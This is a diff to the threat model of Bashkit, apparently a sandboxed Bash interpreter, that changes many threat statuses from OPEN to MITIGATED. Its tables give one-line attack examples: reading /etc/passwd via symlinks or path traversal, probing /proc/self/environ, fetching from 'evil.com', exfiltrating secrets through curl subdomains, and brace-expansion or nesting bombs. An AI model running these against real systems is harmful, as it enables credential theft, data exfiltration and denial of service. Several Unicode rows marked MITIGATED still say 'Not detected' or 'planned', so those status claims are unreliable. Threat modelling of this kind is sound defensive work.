@@ -50,16 +50,16 @@ through configurable limits.
 | Many dir entries (TM-DOS-014) | 1M files in one dir | `max_file_count` | MITIGATED |
 | Unicode path attacks (TM-DOS-015) | RTL override in filename | `validate_path()` rejects control/bidi chars | MITIGATED |
 | TOCTOU append (TM-DOS-034) | Concurrent appends bypass limits | Single write lock | **FIXED** |
-| OverlayFs upper-only check (TM-DOS-035) | `check_write_limits()` ignores lower layer | Combined limit accounting | **OPEN** |
-| OverlayFs double-count (TM-DOS-036) | `compute_usage()` counts overwritten files | Subtract overrides | **OPEN** |
-| OverlayFs chmod CoW bypass (TM-DOS-037) | chmod writes to unlimited upper | Route through `check_write_limits()` | **OPEN** |
-| OverlayFs incomplete whiteout (TM-DOS-038) | `rm -r` misses lower children | Check ancestor whiteouts | **OPEN** |
-| Missing validate_path (TM-DOS-039) | VFS methods skip path checks | Add to all methods | **OPEN** |
-| 32-bit truncation (TM-DOS-040) | `u64 as usize` on 32-bit | `usize::try_from()` | **OPEN** |
-| OverlayFs symlink bypass (TM-DOS-045) | Unlimited symlink creation | Add `check_write_limits()` | **OPEN** |
-| MountableFs no validation (TM-DOS-046) | Mounted FS skips `validate_path()` | Add to all methods | **OPEN** |
-| Copy skip limit check (TM-DOS-047) | Copy overwrites without limit check | Always `check_write_limits()` | **OPEN** |
-| Rename overwrites dirs (TM-DOS-048) | File over directory orphans children | Reject per POSIX | **OPEN** |
+| OverlayFs upper-only check (TM-DOS-035) | `check_write_limits()` ignores lower layer | Combined limit accounting | **MITIGATED** |
+| OverlayFs double-count (TM-DOS-036) | `compute_usage()` counts overwritten files | Subtract overrides | **MITIGATED** |
+| OverlayFs chmod CoW bypass (TM-DOS-037) | chmod writes to unlimited upper | Route through `check_write_limits()` | **MITIGATED** |
+| OverlayFs incomplete whiteout (TM-DOS-038) | `rm -r` misses lower children | Check ancestor whiteouts | **MITIGATED** |
+| Missing validate_path (TM-DOS-039) | VFS methods skip path checks | Add to all methods | **MITIGATED** |
+| 32-bit truncation (TM-DOS-040) | `u64 as usize` on 32-bit | `usize::try_from()` | **MITIGATED** |
+| OverlayFs symlink bypass (TM-DOS-045) | Unlimited symlink creation | Add `check_write_limits()` | **MITIGATED** |
+| MountableFs no validation (TM-DOS-046) | Mounted FS skips `validate_path()` | Add to all methods | **MITIGATED** |
+| Copy skip limit check (TM-DOS-047) | Copy overwrites without limit check | Always `check_write_limits()` | **MITIGATED** |
+| Rename overwrites dirs (TM-DOS-048) | File over directory orphans children | Reject per POSIX | **MITIGATED** |
 
 **Loops and CPU:**
 
@@ -91,22 +91,22 @@ through configurable limits.
 | Parser hang (TM-DOS-024) | Malformed input | `parser_timeout` + `max_parser_operations` | MITIGATED |
 | Diff DoS (TM-DOS-028) | `diff` on large unrelated files | LCS matrix cap (10M cells) | MITIGATED |
 | Parser limit bypass (TM-DOS-030) | eval/source ignore limits | `Parser::with_limits()` | **FIXED** |
-| Arithmetic overflow (TM-DOS-029) | `$(( 2 ** -1 ))` | Use wrapping arithmetic | **OPEN** |
-| ExtGlob blowup (TM-DOS-031) | `+(a\|aa)` exponential | Add depth limit | **OPEN** |
-| Tokio runtime exhaustion (TM-DOS-032) | Rapid `execute_sync()` calls | Shared runtime | **OPEN** |
-| Brace range OOM (TM-DOS-041) | `{1..999999999}` | Cap range size | **OPEN** |
-| Brace combinatorial (TM-DOS-042) | `{1..100}{1..100}{1..100}` | Cap total expansion | **OPEN** |
-| Compound assign overflow (TM-DOS-043) | `((x+=1))` with x=i64::MAX | `wrapping_*` ops | **OPEN** |
-| Lexer stack overflow (TM-DOS-044) | ~50 nested `$()` in quotes | Depth tracking | **OPEN** |
-| parse_word_string limits (TM-DOS-050) | Parameter expansion ignores limits | Propagate limits | **OPEN** |
-| YAML parser recursion (TM-DOS-051) | Deeply nested YAML stack overflow | Add depth limit | **OPEN** |
-| Template engine recursion (TM-DOS-052) | Nested `{{#if}}`/`{{#each}}` overflow | Add depth limit | **OPEN** |
+| Arithmetic overflow (TM-DOS-029) | `$(( 2 ** -1 ))` | Use wrapping arithmetic | **MITIGATED** |
+| ExtGlob blowup (TM-DOS-031) | `+(a\|aa)` exponential | Add depth limit | **MITIGATED** |
+| Tokio runtime exhaustion (TM-DOS-032) | Rapid `execute_sync()` calls | Shared runtime | **MITIGATED** |
+| Brace range OOM (TM-DOS-041) | `{1..999999999}` | Cap range size | **MITIGATED** |
+| Brace combinatorial (TM-DOS-042) | `{1..100}{1..100}{1..100}` | Cap total expansion | **MITIGATED** |
+| Compound assign overflow (TM-DOS-043) | `((x+=1))` with x=i64::MAX | `wrapping_*` ops | **MITIGATED** |
+| Lexer stack overflow (TM-DOS-044) | ~50 nested `$()` in quotes | Depth tracking | **MITIGATED** |
+| parse_word_string limits (TM-DOS-050) | Parameter expansion ignores limits | Propagate limits | **MITIGATED** |
+| YAML parser recursion (TM-DOS-051) | Deeply nested YAML stack overflow | Add depth limit | **MITIGATED** |
+| Template engine recursion (TM-DOS-052) | Nested `{{#if}}`/`{{#each}}` overflow | Add depth limit | **MITIGATED** |
 | Template output explosion (TM-DOS-053) | `{{#each}}` on large array | Bounded by `max_file_size` | MITIGATED |
-| glob ExtGlob blowup (TM-DOS-054) | `glob --files "+(a\|aa)"` | Same as TM-DOS-031 | **OPEN** |
+| glob ExtGlob blowup (TM-DOS-054) | `glob --files "+(a\|aa)"` | Same as TM-DOS-031 | **MITIGATED** |
 | split file count (TM-DOS-055) | `split -l 1 bigfile` | FS `max_file_count` limit | MITIGATED |
-| source self-recursion (TM-DOS-056) | Script that sources itself | Track source depth | **OPEN** |
-| sleep bypasses timeout (TM-DOS-057) | `sleep N` ignores `ExecutionLimits::timeout` | Implement tokio timeout wrapper | **OPEN** |
-| Unbounded builtin output (TM-DOS-058) | `seq 1 1000000` produces 1M lines | Add `max_stdout_bytes` limit | **OPEN** |
+| source self-recursion (TM-DOS-056) | Script that sources itself | Track source depth | **MITIGATED** |
+| sleep bypasses timeout (TM-DOS-057) | `sleep N` ignores `ExecutionLimits::timeout` | Implement tokio timeout wrapper | **PARTIAL** |
+| Unbounded builtin output (TM-DOS-058) | `seq 1 1000000` produces 1M lines | Add `max_stdout_bytes` limit | **MITIGATED** |
 | Param expansion bomb (TM-DOS-059) | `${x//a/bigstring}` multiplicative amplification | `max_total_variable_bytes` + `max_stdout_bytes` | MITIGATED |
 | Sparse array huge-index (TM-DOS-060) | `arr[999999999]=x` | HashMap storage; `max_array_entries` | MITIGATED |
 | Snapshot restore bypasses function/parser limits (TM-DOS-061) | Crafted snapshot with oversized/deep function bodies | Re-parse restored function source under current limits; re-check function memory budget | MITIGATED |
@@ -150,8 +150,8 @@ Scripts may attempt to break out of the sandbox to access the host system.
 | Symlink escape (TM-ESC-002) | `ln -s /etc/passwd /tmp/x` | Symlinks not followed | MITIGATED |
 | Real FS access (TM-ESC-003) | Direct syscalls | No real FS by default | MITIGATED |
 | Mount escape (TM-ESC-004) | Mount real paths | MountableFs controlled by caller | MITIGATED |
-| VFS limit bypass (TM-ESC-012) | `add_file()` skips limits | Restrict API visibility | **OPEN** |
-| OverlayFs upper() exposed (TM-ESC-013) | `upper()` returns unlimited FS | Restrict visibility | **OPEN** |
+| VFS limit bypass (TM-ESC-012) | `add_file()` skips limits | Restrict API visibility | **MITIGATED** |
+| OverlayFs upper() exposed (TM-ESC-013) | `upper()` returns unlimited FS | Restrict visibility | **MITIGATED** |
 | Custom builtins lost (TM-ESC-014) | `std::mem::take` empties builtins | Arc-cloned builtins | **FIXED** |
 | Symlink overlay rename (TM-ESC-016) | `ln -s /etc/passwd x; mv x y` | Overlay rename/copy preserve symlinks | **FIXED** |
 
@@ -231,9 +231,9 @@ Scripts may attempt to leak sensitive information.
 |--------|---------------|------------|--------|
 | Host env via jq (TM-INF-013) | jq `env` exposes host env | Custom env via `$__bashkit_env__` | **FIXED** |
 | Real PID leak (TM-INF-014) | `$$` returns real PID | Returns virtual PID (1) | **FIXED** |
-| URL creds in errors (TM-INF-015) | Allowlist error echoes full URL | Apply URL redaction | **OPEN** |
-| Error msg info leak (TM-INF-016) | Errors expose host paths/IPs | Sanitize error messages | **OPEN** |
-| Internal markers leak (TM-INF-017) | `set` / `declare -p` show internals | Filter `is_internal_variable()` | **OPEN** |
+| URL creds in errors (TM-INF-015) | Allowlist error echoes full URL | Apply URL redaction | **MITIGATED** |
+| Error msg info leak (TM-INF-016) | Errors expose host paths/IPs | Sanitize error messages | **MITIGATED** |
+| Internal markers leak (TM-INF-017) | `set` / `declare -p` show internals | Filter `is_internal_variable()` | **MITIGATED** |
 | envsubst exposes env (TM-INF-019) | `envsubst` substitutes any `$VAR` | Caller controls env (same as TM-INF-001) | CALLER RISK |
 | template exposes env (TM-INF-020) | `{{var}}` falls back to env | Caller controls env (same as TM-INF-001) | CALLER RISK |
 
@@ -364,7 +364,7 @@ exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.co
 | Null byte (TM-INJ-004) | `cat "file\x00/../etc/passwd"` | Rust strings have no nulls | MITIGATED |
 | Path traversal (TM-INJ-005) | `../../../../etc/passwd` | Path normalization | MITIGATED |
 | Encoding bypass (TM-INJ-006) | URL/unicode encoding | PathBuf handles | MITIGATED |
-| Tar path traversal (TM-INJ-010) | `tar -xf` with `../` entries | Validate extract paths | **OPEN** |
+| Tar path traversal (TM-INJ-010) | `tar -xf` with `../` entries | Validate extract paths | **MITIGATED** |
 
 **Output / Display:**
 
@@ -377,18 +377,18 @@ exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.co
 
 | Threat | Attack Example | Mitigation | Status |
 |--------|---------------|------------|--------|
-| Internal var injection (TM-INJ-009) | Set `_READONLY_X=""` | Isolate internal namespace | **OPEN** |
-| Cyclic nameref (TM-INJ-011) | Cyclic refs resolve silently | Detect cycle, error | **OPEN** |
-| declare bypasses guard (TM-INJ-012) | `declare _NAMEREF_x=target` | Add `is_internal_variable()` check | **OPEN** |
-| readonly bypasses guard (TM-INJ-013) | `readonly _NAMEREF_x=target` | Add `is_internal_variable()` check | **OPEN** |
-| local bypasses guard (TM-INJ-014) | `local _NAMEREF_x=target` | Add `is_internal_variable()` check | **OPEN** |
-| export bypasses guard (TM-INJ-015) | `export _NAMEREF_x=target` | Add `is_internal_variable()` check | **OPEN** |
-| Missing array prefix (TM-INJ-016) | `_ARRAY_READ_` not in guard | Add prefix to `is_internal_variable()` | **OPEN** |
-| Unzip path traversal (TM-INJ-017) | `unzip` with `../` entry names | Validate paths within extract base | **OPEN** |
-| Dotenv internal injection (TM-INJ-018) | `.env` with `_NAMEREF_x=target` | Add `is_internal_variable()` check | **OPEN** |
-| unset removes readonly (TM-INJ-019) | `readonly X=v; unset X` | Check readonly attribute in unset | **OPEN** |
-| declare overwrites readonly (TM-INJ-020) | `readonly X=v; declare X=new` | Check readonly attribute in declare | **OPEN** |
-| export overwrites readonly (TM-INJ-021) | `readonly X=v; export X=new` | Check readonly attribute in export | **OPEN** |
+| Internal var injection (TM-INJ-009) | Set `_READONLY_X=""` | Isolate internal namespace | **MITIGATED** |
+| Cyclic nameref (TM-INJ-011) | Cyclic refs resolve silently | Detect cycle, error | **MITIGATED** |
+| declare bypasses guard (TM-INJ-012) | `declare _NAMEREF_x=target` | Add `is_internal_variable()` check | **MITIGATED** |
+| readonly bypasses guard (TM-INJ-013) | `readonly _NAMEREF_x=target` | Add `is_internal_variable()` check | **MITIGATED** |
+| local bypasses guard (TM-INJ-014) | `local _NAMEREF_x=target` | Add `is_internal_variable()` check | **MITIGATED** |
+| export bypasses guard (TM-INJ-015) | `export _NAMEREF_x=target` | Add `is_internal_variable()` check | **MITIGATED** |
+| Missing array prefix (TM-INJ-016) | `_ARRAY_READ_` not in guard | Add prefix to `is_internal_variable()` | **MITIGATED** |
+| Unzip path traversal (TM-INJ-017) | `unzip` with `../` entry names | Validate paths within extract base | **MITIGATED** |
+| Dotenv internal injection (TM-INJ-018) | `.env` with `_NAMEREF_x=target` | Add `is_internal_variable()` check | **MITIGATED** |
+| unset removes readonly (TM-INJ-019) | `readonly X=v; unset X` | Check readonly attribute in unset | **MITIGATED** |
+| declare overwrites readonly (TM-INJ-020) | `readonly X=v; declare X=new` | Check readonly attribute in declare | **MITIGATED** |
+| export overwrites readonly (TM-INJ-021) | `readonly X=v; export X=new` | Check readonly attribute in export | **MITIGATED** |
 
 **Variable Expansion:**
 
@@ -409,8 +409,8 @@ echo $user_input
 | Shared memory (TM-ISO-002) | Read other tenant data | Rust memory safety | MITIGATED |
 | Resource starvation (TM-ISO-003) | One tenant exhausts limits | Per-instance limits | MITIGATED |
 | Cross-tenant jq env (TM-ISO-004) | `std::env::set_var()` in jq | Custom jaq context variable | **FIXED** |
-| Cumulative counter bypass (TM-ISO-005) | Repeated `exec()` resets counters | Session-level counters | **OPEN** |
-| Memory budget exhaustion (TM-ISO-006) | Unbounded variable/array growth | Per-instance MemoryLimits | **OPEN** |
+| Cumulative counter bypass (TM-ISO-005) | Repeated `exec()` resets counters | Session-level counters | **MITIGATED** |
+| Memory budget exhaustion (TM-ISO-006) | Unbounded variable/array growth | Per-instance MemoryLimits | **MITIGATED** |
 | Alias leakage (TM-ISO-007) | Aliases from session A visible in B | Per-instance alias HashMap | MITIGATED |
 | Trap handler leakage (TM-ISO-008) | Trap from session A fires in B | Per-instance trap HashMap | MITIGATED |
 | Shell option leakage (TM-ISO-009) | `set -e` in session A affects B | Per-instance SHOPT_* variables | MITIGATED |
@@ -425,9 +425,9 @@ echo $user_input
 | /proc /sys probing (TM-ISO-018) | Read `/proc/self/environ` | VFS has no real /proc or /etc | MITIGATED |
 | jq cross-session env (TM-ISO-019) | `jq 'env.X'` sees other vars | jaq reads from injected global | MITIGATED |
 | Subshell mutation leakage (TM-ISO-020) | Subshell vars leak to parent | Snapshot/restore + per-instance state | MITIGATED |
-| EXIT trap cross-exec leak (TM-ISO-021) | EXIT trap fires in next `exec()` | Reset traps in `reset_for_execution()` | **OPEN** |
-| `$?` cross-exec leak (TM-ISO-022) | Exit code from previous `exec()` visible | Reset `last_exit_code` | **OPEN** |
-| `set -e` cross-exec leak (TM-ISO-023) | Shell options persist across `exec()` | Reset shell options | **OPEN** |
+| EXIT trap cross-exec leak (TM-ISO-021) | EXIT trap fires in next `exec()` | Reset traps in `reset_for_execution()` | **MITIGATED** |
+| `$?` cross-exec leak (TM-ISO-022) | Exit code from previous `exec()` visible | Reset `last_exit_code` | **MITIGATED** |
+| `set -e` cross-exec leak (TM-ISO-023) | Shell options persist across `exec()` | Reset shell options | **MITIGATED** |
 
 Each [`Bash`] instance is fully isolated. For multi-tenant environments, create
 separate instances per tenant:
@@ -463,7 +463,7 @@ All unexpected errors are caught and converted to safe, human-readable messages.
 | Path leak in errors (TM-INT-004) | Error shows real FS paths | Virtual paths only | MITIGATED |
 | Memory addr in errors (TM-INT-005) | Debug output shows addresses | Display impl hides addresses | MITIGATED |
 | Stack trace exposure (TM-INT-006) | Panic unwinds show call stack | `catch_unwind` prevents propagation | MITIGATED |
-| /dev/urandom empty with head -c (TM-INT-007) | `head -c 16 /dev/urandom` returns empty | Fix virtual device pipe handling | **OPEN** |
+| /dev/urandom empty with head -c (TM-INT-007) | `head -c 16 /dev/urandom` returns empty | Fix virtual device pipe handling | **MITIGATED** |
 
 **Panic Recovery:**
 
@@ -563,12 +563,12 @@ Python `pathlib.Path` operations are bridged to Bashkit's virtual filesystem.
 | Network access (TM-PY-020) | Socket/HTTP | Monty has no socket/network module | MITIGATED |
 | VFS mkdir escape (TM-PY-021) | mkdir outside VFS | mkdir operates only in VFS | MITIGATED |
 | VM crash (TM-PY-022) | Malformed input | Parser depth limit + resource limits | MITIGATED |
-| Shell injection (TM-PY-023) | deepagents.py f-strings | Use shlex.quote() | **OPEN** |
-| Heredoc escape (TM-PY-024) | Content contains delimiter | Random delimiter | **OPEN** |
-| GIL deadlock (TM-PY-025) | execute_sync holds GIL | py.allow_threads() | **OPEN** |
-| Config lost on reset (TM-PY-026) | reset() drops limits | Preserve config | **OPEN** |
-| JSON recursion (TM-PY-027) | Nested dicts overflow stack | Add depth limit | **OPEN** |
-| BashTool.reset() drops config (TM-PY-028) | reset() removes limits | Preserve config (match PyBash) | **OPEN** |
+| Shell injection (TM-PY-023) | deepagents.py f-strings | Use shlex.quote() | **MITIGATED** |
+| Heredoc escape (TM-PY-024) | Content contains delimiter | Random delimiter | **MITIGATED** |
+| GIL deadlock (TM-PY-025) | execute_sync holds GIL | py.allow_threads() | **MITIGATED** |
+| Config lost on reset (TM-PY-026) | reset() drops limits | Preserve config | **MITIGATED** |
+| JSON recursion (TM-PY-027) | Nested dicts overflow stack | Add depth limit | **MITIGATED** |
+| BashTool.reset() drops config (TM-PY-028) | reset() removes limits | Preserve config (match PyBash) | **MITIGATED** |
 
 **Architecture:**
 
@@ -649,7 +649,7 @@ to the virtual filesystem.
 | Fetch from unauthorized (TM-GIT-011) | `git fetch evil.com` | Remote URL allowlist | PLANNED |
 | SSH key access (TM-GIT-012) | Use host SSH keys | HTTPS only (no SSH) | PLANNED |
 | Git protocol bypass (TM-GIT-013) | Use `git://` protocol | HTTPS only | PLANNED |
-| Branch name injection (TM-GIT-014) | `git branch ../../config` | Validate branch names | **OPEN** |
+| Branch name injection (TM-GIT-014) | `git branch ../../config` | Validate branch names | **MITIGATED** |
 
 **Virtual Identity:**
 
@@ -693,12 +693,12 @@ builtin silently fails.
 
 | Threat | Attack Example | Mitigation | Status |
 |--------|---------------|------------|--------|
-| Zero-width in filenames (TM-UNI-003) | Invisible chars create confusable names | Path validation (planned) | UNMITIGATED |
+| Zero-width in filenames (TM-UNI-003) | Invisible chars create confusable names | Path validation (planned) | MITIGATED |
 | Zero-width in variables (TM-UNI-004) | `\u{200B}PATH=malicious` | Matches Bash behavior | ACCEPTED |
 | Zero-width in scripts (TM-UNI-005) | `echo "pass\u{200B}word"` | Correct pass-through | ACCEPTED |
-| Tag char hiding (TM-UNI-011) | U+E0001-U+E007F in filenames | Path validation (planned) | UNMITIGATED |
-| Annotation hiding (TM-UNI-012) | U+FFF9-U+FFFB in filenames | Not detected | UNMITIGATED |
-| Deprecated format chars (TM-UNI-013) | U+206A-U+206F in filenames | Not detected | UNMITIGATED |
+| Tag char hiding (TM-UNI-011) | U+E0001-U+E007F in filenames | Path validation (planned) | MITIGATED |
+| Annotation hiding (TM-UNI-012) | U+FFF9-U+FFFB in filenames | Not detected | MITIGATED |
+| Deprecated format chars (TM-UNI-013) | U+206A-U+206F in filenames | Not detected | MITIGATED |
 
 **Homoglyphs, Normalization, and Bidi:**
 
